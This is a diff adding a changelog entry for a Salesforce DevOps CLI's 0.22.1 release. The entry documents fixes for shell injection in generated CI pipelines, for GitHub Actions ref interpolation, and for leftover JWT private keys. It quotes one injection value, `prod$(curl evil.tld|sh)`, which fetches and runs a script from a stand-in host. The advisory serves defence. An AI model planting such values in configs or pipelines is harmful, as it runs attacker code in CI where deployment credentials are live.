@@ -7,6 +7,44 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.22.1] - 2026-08-03
+
+### Security
+
+- **`sfdt ci init` validates every value it writes into a generated pipeline.** The org alias,
+  branch, delta base, environment, definition-file path, Node version and cron expression are
+  substituted into shell commands in the file that gets written, and `org`, `branch`, `environment`
+  and `scratchDef` default from `.sfdt/config.json` — which is committed, so it arrives with
+  whatever repository was cloned. A `defaultOrg` of `prod$(curl evil.tld|sh)` became
+  `--org prod$(curl evil.tld|sh)` inside a `run:` line. The damage is not local: the generated file
+  is committed and pushed by the victim, then runs in CI **after** the auth step with `SFDX_AUTH_URL`
+  or JWT material live in the job. Each value is now checked against a character set appropriate to
+  what it is, and a value outside it aborts generation with a message naming the key and where to
+  fix it — nothing is written. Validated rather than escaped because escaping would have to be
+  correct for YAML *and* the provider-specific shell embedded in it, in every template; `org` reuses
+  the same `ORG_ALIAS_RE` the bridge contract already enforces. Legitimate aliases, refs and paths
+  are unaffected.
+- **`github-deploy.yml` no longer interpolates a git ref into shell source.**
+  `${{ github.event.pull_request.base.ref }}` sat directly in a `run:` block; Actions substitutes
+  `${{ }}` *before* bash parses the script, and ref names permit `$`, backticks, `(`, `)`, `;` and
+  `|`. It now travels via `env: BASE_REF` and is dereferenced as `"origin/$BASE_REF"`, where it is
+  only ever data.
+- **The GitLab and Bitbucket JWT auth partials no longer leave `server.key` behind when login
+  fails.** Both wrote the key and removed it in a *separate* script entry, so a failed
+  `sf org login jwt` aborted the run with the org's private key still in the workspace — one broad
+  `artifacts:` or `cache:` path away from being published to anyone who can download build
+  artifacts. Both now carry `trap 'rm -f server.key' EXIT`, matching GitHub, Azure and `action.yml`.
+  The write and the login had to move into a single shell invocation for the trap to cover them —
+  each entry in a `script:` list is its own shell.
+
+### Fixed
+
+- **Test harness: a failed CSRF token fetch no longer fails open.** `test/setup-supertest-origin.js`
+  fetches a CSRF token for the app under test; when that fetch failed it sent the real request with
+  no `X-SFDT-CSRF` header, the server correctly answered 403, and the test failed asserting some
+  unrelated status with nothing pointing at the token fetch. It now retries once and reports both
+  attempts if it still fails. Test-infrastructure only; no shipped behaviour changes.
+
 ## [0.22.0] - 2026-08-03
 
 > **Action may be required.** `.sfdt/config.json` is now treated as untrusted input, and four
